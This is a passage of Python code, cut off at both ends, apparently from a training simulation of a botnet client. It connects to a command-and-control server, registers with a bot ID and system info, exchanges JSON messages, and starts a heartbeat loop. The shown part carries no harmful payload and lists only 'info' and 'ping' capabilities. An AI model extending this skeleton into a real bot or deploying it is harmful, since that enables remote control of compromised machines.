    def connect_to_cc(self):
        """Establish connection to C&C server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.server_host, self.server_port))
            print(f"[TRAINING] Bot {self.bot_id} connected to C&C")

            # Send registration
            self.register_with_cc()
            return True

        except Exception as e:
            print(f"[TRAINING] Connection failed: {e}")
            return False

    def register_with_cc(self):
        """Register bot with C&C server"""
        registration_data = {
            'type': 'registration',
            'bot_id': self.bot_id,
            'system_info': {
                'platform': 'training_environment',
                'version': '1.0',
                'capabilities': ['info', 'ping']
            },
            'timestamp': datetime.now().isoformat()
        }

        self.send_message(registration_data)
        response = self.receive_message()

        if response and response.get('status') == 'success':
            print(f"[TRAINING] Registration successful")
        else:
            print(f"[TRAINING] Registration failed")

    def send_message(self, message):
        """Send JSON message to C&C server"""
        try:
            data = json.dumps(message).encode('utf-8')
            self.socket.send(data)
        except Exception as e:
            print(f"[TRAINING] Send error: {e}")

    def receive_message(self):
        """Receive and parse JSON message from C&C"""
        try:
            data = self.socket.recv(4096)
            if data:
                return json.loads(data.decode('utf-8'))
        except Exception as e:
            print(f"[TRAINING] Receive error: {e}")
        return None

    def start_heartbeat(self):
        """Start heartbeat loop to maintain connection"""
        self.running = True

        while self.running:
            try:
                # Send heartbeat
                heartbeat = {
                    'type': 'heartbeat',
                    'bot_id': self.bot_id,
                    'timestamp': datetime.now().isoformat()
